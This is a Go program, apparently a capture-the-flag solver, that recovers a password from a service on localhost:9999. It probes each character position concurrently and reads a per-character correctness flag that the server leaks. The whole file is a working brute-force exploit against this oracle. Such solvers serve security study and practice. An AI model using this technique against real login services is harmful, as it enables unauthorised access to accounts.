package main

import (
	"bufio"
	"errors"
	"fmt"
	"net"
	"strings"
)

type WorkData = struct {
	errorHappened error
	index         int
	gotRune       rune
}

const (
	printable  = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ \t\n\r\x0b\x0c"
)


func getWordLength() (int, error) {
	client, err := net.Dial("tcp", "localhost:9999")
	if err != nil {
		panic(err)
	}

	defer client.Close()


	bw := bufio.NewWriter(client)
	br := bufio.NewReader(client)

	br.ReadString(' ')
	bw.WriteRune('\n')
	if err := bw.Flush(); err != nil {
		return 0, err
	}

	answer, err := br.ReadString('\n')
	answer = answer[:len(answer) - 1]
	if err != nil { return 0, err }



	return len(answer), nil


}

func main() {
	wordLength, err := getWordLength()
	if err != nil {
		panic(err)
	}
	fmt.Printf("word length: %d\n", wordLength)

	// init job
	workPipe := make(chan WorkData)
	registered := make([]rune, wordLength)
	for i := 0; i < wordLength; i++ {
		go doWork(i, workPipe)
	}

	for i := 0; i < wordLength; {
		select {
		case work := <-workPipe:
			if work.errorHappened != nil {
				panic(work.errorHappened)
			}
			fmt.Printf("[%d] got rune %q\n", work.index, work.gotRune)
			registered[work.index] = work.gotRune
			i++

		}
	}

	fmt.Printf("password: %q", string(registered))

}

func doWork(index int, pipe chan WorkData) {
	initial_garbage := strings.Repeat("a", index)
	client, err := net.Dial("tcp", "localhost:9999")
	if err != nil {
		fmt.Println("Could not achieve connection: ", err.Error())
		panic(err)
	}

	defer client.Close()

	bw := bufio.NewWriter(client)
	br := bufio.NewReader(client)

	for _, chr := range printable {
		br.ReadString(':')
		next_pwd := initial_garbage + string(chr)
		bw.WriteString(next_pwd)
		bw.WriteRune('\n')
		bw.Flush()
		buf, err := br.ReadString('\n')
		if err != nil {
			data := WorkData{errorHappened: err, index: index, gotRune: 'a'}
			pipe <- data
			return
		}

		if buf[index+1] == byte('1') {
			data := WorkData{errorHappened: nil, index: index, gotRune: chr}
			pipe <- data
			return
		}

	}

	data := WorkData{errorHappened: errors.New("Could not find a suitable character"), index: index, gotRune: '0'}
	pipe <- data
	return
}
